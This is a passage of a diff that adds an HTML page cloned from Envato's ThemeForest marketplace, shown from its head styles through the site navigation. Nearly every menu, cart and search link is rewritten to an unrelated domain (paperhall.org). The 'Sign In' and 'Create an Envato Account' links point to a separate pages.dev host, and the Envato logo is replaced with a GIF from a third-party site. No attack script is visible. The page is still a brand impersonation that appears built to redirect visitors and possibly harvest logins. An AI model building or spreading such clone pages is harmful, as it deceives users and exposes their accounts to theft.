4zNzVMMTUuODMzMyA1LjM1VjguNzVDMTUuODMzMyA4Ljk4MDEyIDE2LjAxOTkgOS4xNjY2NyAxNi4yNSA5LjE2NjY3SDE3LjA4MzNDMTcuMzEzNSA5LjE2NjY3IDE3LjUgOC45ODAxMiAxNy41IDguNzVWMy4zMzMzM0MxNy40OTU1IDMuMTczNDIgMTcuNDI5OSAzLjAyMTMyIDE3LjMxNjcgMi45MDgzM1YyLjkxNjY3WlwiIGZpbGw9XCIlMjMxQTQyMDBcIi8+PC9nPjwvc3ZnPicpXG5cbiJdLCJzb3VyY2VSb290IjoiIn0= */
+    </style>
+    <style type="text/css">
+        .fancybox-margin {
+            margin-right: 15px;
+        }
+    </style>
+    <meta http-equiv="origin-trial" content="A7JYkbIvWKmS8mWYjXO12SIIsfPdI7twY91Y3LWOV/YbZmN1ZhYv8O+Zs6/IPCfBE99aV9tIC8sWZSCN09vf7gkAAACWeyJvcmlnaW4iOiJodHRwczovL2N0LnBpbnRlcmVzdC5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
+</head>
+
+<body class="color-scheme-light" data-view="app impressionTracker" data-responsive="true" data-user-signed-in="false" __processed_046ac43c-cdf6-4311-9a75-3ea1775342f5__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZW5hYmxlZCIsIkNPTkZJRyI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIyLjAuMjYiLCJzY29yZSI6MjAwMjYwfV0=">
+    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
+        //<![CDATA[
+        var gtmConfig = {}
+
+        //]]>
+    </script>
+
+    <!--[if lte IE 8]>
+  <div style="color:#fff;background:#f00;padding:20px;text-align:center;">
+    ThemeForest no longer actively supports this version of Internet Explorer. We suggest that you <a href="https://windows.microsoft.com/en-us/internet-explorer/download-ie" style="color:#fff;text-decoration:underline;">upgrade to a newer version</a> or <a href="https://browsehappy.com/" style="color:#fff;text-decoration:underline;">try a different browser</a>.
+  </div>
+<![endif]-->
+
+    <script src="https://public-assets.envato-static.com/assets/gtm_measurements-40b0a0f82bafab0a0bb77fc35fe1da0650288300b85126c95b4676bcff6e4584.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
+    <noscript>
+        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W8KL5Q5" height="0" width="0"
+            style="display:none;visibility:hidden">
+        </iframe>
+    </noscript>
+
+    <noscript>
+        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KGCDGPL6" height="0" width="0"
+            style="display:none;visibility:hidden">
+        </iframe>
+    </noscript>
+
+
+    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
+        //<![CDATA[
+        (function() {
+            function normalizeAttributeValue(value) {
+                if (value === undefined || value === null) return undefined
+
+                var normalizedValue
+
+                if (Array.isArray(value)) {
+                    normalizedValue = normalizedValue || value
+                        .map(normalizeAttributeValue)
+                        .filter(Boolean)
+                        .join(', ')
+                }
+
+                normalizedValue = normalizedValue || value
+                    .toString()
+                    .toLowerCase()
+                    .trim()
+                    .replace(/&amp;/g, '&')
+                    .replace(/&#39;/g, "'")
+                    .replace(/\s+/g, ' ')
+
+                if (normalizedValue === '') return undefined
+                return normalizedValue
+            }
+
+            var pageAttributes = {
+                app_name: normalizeAttributeValue('Marketplace'),
+                app_env: normalizeAttributeValue('production'),
+                app_version: normalizeAttributeValue('f7d8b3d494288b34cb00105ee5d230d68b0ccca7'),
+                page_type: normalizeAttributeValue('item'),
+                page_location: window.location.href,
+                page_title: document.title,
+                page_referrer: document.referrer,
+                ga_param: normalizeAttributeValue(''),
+                event_attributes: null,
+                user_attributes: {
+                    user_id: normalizeAttributeValue(''),
+                    market_user_id: normalizeAttributeValue(''),
+                }
+            }
+            dataLayer.push(pageAttributes)
+
+            dataLayer.push({
+                event: 'analytics_ready',
+                event_attributes: {
+                    event_type: 'user',
+                    custom_timestamp: Date.now()
+                }
+            })
+        })();
+
+        //]]>
+    </script>
+
+    <div class="page" bis_skin_checked="1">
+        <div class="page__off-canvas--left overflow" bis_skin_checked="1">
+            <div class="off-canvas-left js-off-canvas-left" bis_skin_checked="1">
+                <div class="off-canvas-left__top" bis_skin_checked="1">
+                    <a href="https://www.paperhall.org/halloffame">Envato Market</a>
+                </div>
+
+                <div class="off-canvas-left__current-site -color-themeforest" bis_skin_checked="1">
+                    <span class="off-canvas-left__site-title">
+                        Web Themes &amp; Templates
+                    </span>
+
+                    <a class="off-canvas-left__current-site-toggle -white-arrow -color-themeforest" data-view="dropdown" data-dropdown-target=".off-canvas-left__sites" href="https://www.paperhall.org/halloffame"></a>
+                </div>
+
+                <div class="off-canvas-left__sites is-hidden" id="off-canvas-sites" bis_skin_checked="1">
+                    <a class="off-canvas-left__site" href="hhttps://www.paperhall.org/halloffame">
+                        <span class="off-canvas-left__site-title">
+                            Code
+                        </span>
+                        <i class="e-icon -icon-right-open"></i>
+                    </a>
+                    <a class="off-canvas-left__site" href="https://www.paperhall.org/halloffame">
+                        <span class="off-canvas-left__site-title">
+                            Video
+                        </span>
+                        <i class="e-icon -icon-right-open"></i>
+                    </a>
+                    <a class="off-canvas-left__site" href="https://www.paperhall.org/halloffame">
+                        <span class="off-canvas-left__site-title">
+                            Audio
+                        </span>
+                        <i class="e-icon -icon-right-open"></i>
+                    </a>
+                    <a class="off-canvas-left__site" href="https://www.paperhall.org/halloffame">
+                        <span class="off-canvas-left__site-title">
+                            Graphics
+                        </span>
+                        <i class="e-icon -icon-right-open"></i>
+                    </a>
+                    <a class="off-canvas-left__site" href="https://www.paperhall.org/halloffame">
+                        <span class="off-canvas-left__site-title">
+                            Photos
+                        </span>
+                        <i class="e-icon -icon-right-open"></i>
+                    </a>
+                    <a class="off-canvas-left__site" href="https://www.paperhall.org/halloffame">
+                        <span class="off-canvas-left__site-title">
+                            3D Files
+                        </span>
+                        <i class="e-icon -icon-right-open"></i>
+                    </a>
+                </div>
+
+                <div class="off-canvas-left__search" bis_skin_checked="1">
+                    <form id="search" action="https://www.paperhall.org/halloffame" accept-charset="UTF-8" method="get">
+                        <div class="search-field -border-none" bis_skin_checked="1">
+                            <div class="search-field__input" bis_skin_checked="1">
+                                <input id="term" name="term" type="search" placeholder="Search" class="search-field__input-field">
+                            </div>
+                            <button class="search-field__button" type="submit">
+                                <i class="e-icon -icon-search"><span class="e-icon__alt">Search</span></i>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <ul>
+
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-all-items" href="https://www.paperhall.org/halloffame">
+                            All Items
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-all-items">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Popular Files</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Featured Files</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Top New Files</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Follow Feed</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Top Authors</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Top New
+                                    Authors</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Public Collections</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">View All Categories</a>
+                            </li>
+                        </ul>
+
+                    </li>
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-wordpress" href="https://www.paperhall.org/halloffame">
+                            WordPress
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-wordpress">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Show all
+                                    WordPress</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Popular Items</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Blog /
+                                    Magazine</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">BuddyPress</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Corporate</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Creative</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Directory &amp; Listings</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">eCommerce</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Education</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Elementor</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Entertainment</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Mobile</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Nonprofit</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Real
+                                    Estate</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Retail</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Technology</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Wedding</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Miscellaneous</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">WordPress Plugins</a>
+                            </li>
+                        </ul>
+
+                    </li>
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-elementor" href="https://www.paperhall.org/halloffame">
+                            Elementor
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-elementor">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Template Kits</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Plugins</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Themes</a>
+                            </li>
+                        </ul>
+
+                    </li>
+                    <li>
+
+                        <a class="off-canvas-category-link--empty" href="https://www.paperhall.org/halloffame">
+                            Hosting
+                        </a>
+                    </li>
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-html" href="https://www.paperhall.org/halloffame">
+                            HTML
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-html">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Show all
+                                    HTML</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Popular Items</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Admin Templates</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Corporate</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Creative</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Entertainment</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Mobile</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Nonprofit</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Personal</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Retail</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Specialty Pages</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Technology</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Wedding</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Miscellaneous</a>
+                            </li>
+                        </ul>
+
+                    </li>
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-shopify" href="https://www.paperhall.org/halloffame">
+                            Shopify
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-shopify">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Show all
+                                    Shopify</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Popular Items</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Fashion</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Shopping</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Health &amp; Beauty</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Technology</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Entertainment</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Miscellaneous</a>
+                            </li>
+                        </ul>
+
+                    </li>
+                    <li>
+
+                        <a class="off-canvas-category-link--empty" href="https://www.paperhall.org/halloffame">
+                            Jamstack
+                        </a>
+                    </li>
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-marketing" href="https://www.paperhall.org/halloffame">
+                            Marketing
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-marketing">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Show all
+                                    Marketing</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Popular Items</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Email Templates</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Landing Pages</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Unbounce Landing Pages</a>
+                            </li>
+                        </ul>
+
+                    </li>
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-cms" href="https://www.paperhall.org/halloffame">
+                            CMS
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-cms">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Show all CMS</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Popular Items</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Concrete5</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Drupal</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">HubSpot CMS Hub</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Joomla</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">MODX
+                                    Themes</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Moodle</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Webflow</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Weebly</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Miscellaneous</a>
+                            </li>
+                        </ul>
+
+                    </li>
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-ecommerce" href="https://www.paperhall.org/halloffame">
+                            eCommerce
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-ecommerce">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Show all
+                                    eCommerce</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Popular Items</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">WooCommerce</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">BigCommerce</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Drupal Commerce</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Easy Digital Downloads</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Ecwid</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Magento</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">OpenCart</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">PrestaShop</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Shopify</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Ubercart</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">VirtueMart</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Zen
+                                    Cart</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Miscellaneous</a>
+                            </li>
+                        </ul>
+
+                    </li>
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-ui-templates" href="https://www.paperhall.org/halloffame">
+                            UI Templates
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-ui-templates">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Popular Items</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Figma</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Adobe
+                                    XD</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Photoshop</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Sketch</a>
+                            </li>
+                        </ul>
+
+                    </li>
+                    <li>
+
+                        <a class="off-canvas-category-link--empty" href="https://www.paperhall.org/halloffame">
+                            Plugins
+                        </a>
+                    </li>
+                    <li>
+                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-more" href="https://www.paperhall.org/halloffame">
+                            More
+                        </a>
+                        <ul class="is-hidden" id="off-canvas-more">
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Blogging</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Courses</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Facebook Templates</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Free Elementor Templates</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Free
+                                    WordPress Themes</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Forums</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Ghost
+                                    Themes</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub" href="https://www.paperhall.org/halloffame">Tumblr</a>
+                            </li>
+                            <li>
+                                <a class="off-canvas-category-link--sub external-link elements-nav__category-link" target="_blank" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;sub nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionName&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}"
+                                    data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;sub nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionName&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}"
+                                    href="https://www.paperhall.org/halloffame">Unlimited
+                                    Creative Assets</a>
+                            </li>
+                        </ul>
+
+                    </li>
+
+                    <li>
+                        <a class="elements-nav__category-link external-link" target="_blank" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionName&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}"
+                            data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionName&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}"
+                            href="https://www.paperhall.org/halloffame">Unlimited
+                            Downloads</a>
+                    </li>
+
+                </ul>
+
+            </div>
+
+        </div>
+
+        <div class="page__off-canvas--right overflow" bis_skin_checked="1">
+            <div class="off-canvas-right" bis_skin_checked="1">
+                <a class="off-canvas-right__link--cart" href="https://www.paperhall.org/halloffame">
+                    Guest Cart
+                    <div class="shopping-cart-summary is-empty" data-view="cartCount" bis_skin_checked="1">
+                        <span class="js-cart-summary-count shopping-cart-summary__count">0</span>
+                        <i class="e-icon -icon-cart"></i>
+                    </div>
+                </a>
+                <a class="off-canvas-right__link" href="https://paperhall.pages.dev/">
+                    Create an Envato Account
+                    <i class="e-icon -icon-envato"></i>
+                </a>
+                <a class="off-canvas-right__link" href="https://paperhall.pages.dev/">
+                    Sign In
+                    <i class="e-icon -icon-login"></i>
+                </a>
+            </div>
+
+        </div>
+
+        <div class="page__canvas" bis_skin_checked="1">
+            <div class="canvas" bis_skin_checked="1">
+                <div class="canvas__header" bis_skin_checked="1">
+
+                    <header class="site-header">
+                        <div class="site-header__mini is-hidden-desktop" bis_skin_checked="1">
+                            <div class="header-mini" bis_skin_checked="1">
+                                <div class="header-mini__button--cart" bis_skin_checked="1">
+                                    <a class="btn btn--square" href="https://www.paperhall.org/halloffame">
+                                        <svg width="14px" height="14px" viewBox="0 0 14 14" class="header-mini__button-cart-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
+                                            <title>Cart</title>
+                                            <path
+                                                d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 15.23 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.777 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
+                                            </path>
+
+                                        </svg>
+
+
+                                        <span class="is-hidden">Cart</span>
+                                        <span class="header-mini__button-cart-cart-amount is-hidden">
+                                            0
+                                        </span>
+                                    </a>
+                                </div>
+                                <div class="header-mini__button--account" bis_skin_checked="1">
+                                    <a class="btn btn--square" data-view="offCanvasNavToggle" data-off-canvas="right" href="https://www.paperhall.org/halloffame">
+                                        <i class="e-icon -icon-person"></i>
+                                        <span class="is-hidden">Account</span>
+                                    </a>
+                                </div>
+
+                                <div class="header-mini__button--categories" bis_skin_checked="1">
+                                    <a class="btn btn--square" data-view="offCanvasNavToggle" data-off-canvas="left" href="https://www.paperhall.org/halloffame">
+                                        <i class="e-icon -icon-hamburger"></i>
+                                        <span class="is-hidden">Sites, Search &amp; Categories</span>
+                                    </a>
+                                </div>
+
+                                <div class="header-mini__logo" bis_skin_checked="1">
+                                    <a href="https://www.paperhall.org/halloffame">
+                                        <img alt="Logo Baru" src="https://kilat.digital/images/2025/08/12/5d7dd8d2aa39755dc815f9393480d8a4.gif" style="height:40px; width:auto; display:inline-block;">
+                                    </a>
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                        <div class="global-header is-hidden-tablet-and-below" bis_skin_checked="1">
+
+                            <div class="grid-container -layout-wide" bis_skin_checked="1">
+                                <div class="global-header__wrapper" bis_skin_checked="1">
+                                    <a href="https://www.paperhall.org/halloffame">
+                                        <img height="50" alt="Envato Market" class="global-header__logo" src="https://kilat.digital/images/2025/08/12/5d7dd8d2aa39755dc815f9393480d8a4.gif">
+                                    </a>
+                                    
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="site-header__sites is-hidden-tablet-and-below" bis_skin_checked="1">
+                            <div class="header-sites header-site-titles" bis_skin_checked="1">
+                                <div class="grid-container -layout-wide" bis_skin_checked="1">
+                                    <nav class="header-site-titles__container">
+
+                                            <a target="_blank" class="elements-nav__dropdown-container unique-selling-points__variant" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionName&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}"
+                                                data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionName&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}"
+                                                href="https://elements.envato.com/?utm_campaign=elements_mkt-switcher_31JUL2024&amp;utm_content=tf_item_8988002&amp;utm_medium=referral&amp;utm_source=themeforest.net">
+                                                <div class="elements-nav__main-panel" bis_skin_checked="1">
